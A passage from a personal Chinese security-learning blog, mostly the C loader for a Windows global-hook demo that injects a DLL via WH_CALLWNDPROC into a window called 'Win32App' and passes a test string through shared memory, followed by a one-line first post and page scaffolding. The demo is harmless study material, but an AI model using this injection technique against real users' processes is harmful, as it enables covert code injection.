class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, CHAR* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_SetGlobalHook)</span><span class="params">(<span class="keyword">int</span> idHook, LPSTR lpszWindowName)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_UnsetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_Write)</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(*typedef_Read)</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_CreateSharedMemory)</span><span class="params">()</span></span>;</span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">	typedef_SetGlobalHook SetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">	typedef_UnsetGlobalHook UnsetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">	typedef_CreateSharedMemory CreateSharedMemory;</span><br><span class="line">	typedef_Write Write;</span><br><span class="line">	typedef_Read Read;</span><br><span class="line">	DWORD dwBuffLen;</span><br><span class="line">	BYTE szBuff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	LPSTR lpszWindowName = <span class="string">&quot;Win32App&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		hDll = ::LoadLibrary(<span class="string">&quot;C:\\vc6++\\MyProjects\\GlobalHook\\Debug\\GlobalHook.dll&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error[%d]\n&quot;</span>, ::GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		SetGlobalHook = (typedef_SetGlobalHook)::GetProcAddress(hDll, <span class="string">&quot;SetGlobalHook&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == SetGlobalHook)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = SetGlobalHook(WH_CALLWNDPROC, lpszWindowName);</span><br><span class="line">		<span class="keyword">if</span> (bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook ERROR.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//write buff</span></span><br><span class="line">		Write = (typedef_Write)GetProcAddress(hDll, <span class="string">&quot;Write&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == Write)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		bRet = Write(<span class="string">&quot;haha,walker!&quot;</span>, <span class="number">0x20</span>);</span><br><span class="line">		<span class="keyword">if</span> (bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;write success.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;write error.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">		// read buff</span></span><br><span class="line"><span class="comment">		Read = (typedef_Read)GetProcAddress(hDll, &quot;Read&quot;);</span></span><br><span class="line"><span class="comment">		if (NULL == Read)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;GetProcAddress Error[%d]\n&quot;, GetLastError());</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">		dwBuffLen = sizeof(szBuff);</span></span><br><span class="line"><span class="comment">		dwBuffLen = Read((LPSTR)szBuff, dwBuffLen);</span></span><br><span class="line"><span class="comment">		if (dwBuffLen)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;Read data: %s\n&quot;, szBuff);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		else</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;Read error.\n&quot;);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="comment">//获取进程句柄</span></span><br><span class="line">		HWND hwnd = FindWindow(<span class="literal">NULL</span>, lpszWindowName);</span><br><span class="line">		<span class="keyword">if</span> (!hwnd)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//printf(&quot;获取进程句柄失败！\n&quot;);</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">		SendMessage(hwnd, WM_USER + <span class="number">0x1</span>, <span class="number">0x1234</span>, <span class="number">0x5678</span>);</span><br><span class="line"></span><br><span class="line">		UnsetGlobalHook = (typedef_UnsetGlobalHook)::GetProcAddress(hDll, <span class="string">&quot;UnsetGlobalHook&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == UnsetGlobalHook)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = UnsetGlobalHook();</span><br><span class="line">		<span class="keyword">if</span>(bRet)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook falied.\n&quot;</span>);</span><br><span class="line">		SendMessage(hwnd, WM_USER + <span class="number">0x1</span>, <span class="number">0x1234</span>, <span class="number">0x5678</span>);</span><br><span class="line">	&#125;<span class="keyword">while</span>(FALSE);</span><br><span class="line">	FreeLibrary(hDll);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>效果图如下：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210225184758493.png" alt="image-20210225184758493" style="zoom:80%;" align="left">


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://walker-nie.github.io/%E6%9D%82%E8%B0%88/my-first-blog/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fup.enterdesk.com%2Fedpic%2Ff6%2Fc9%2Ff6%2Ff6c9f647a533782026c0609ac5d550df.jpg&refer=http%3A%2F%2Fup.enterdesk.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643531815&t=c2c18e0685888311dca4f731dd286208">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="walker's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E6%9D%82%E8%B0%88/my-first-blog/" itemprop="url">my-first-blog</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-02T17:08:26+08:00">
                2022-01-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index">
                    <span itemprop="name">杂谈</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  6 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span> is my first bolg.</span><br></pre></td></tr></table></figure>


          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fup.enterdesk.com%2Fedpic%2Ff6%2Fc9%2Ff6%2Ff6c9f647a533782026c0609ac5d550df.jpg&refer=http%3A%2F%2Fup.enterdesk.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643531815&t=c2c18e0685888311dca4f731dd286208"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7Carchive">
              
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2021 &mdash; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">walker</span>

  
</div>








  <div class="footer-custom">Hosted by walker</div>


<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("01/02/2022 13:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
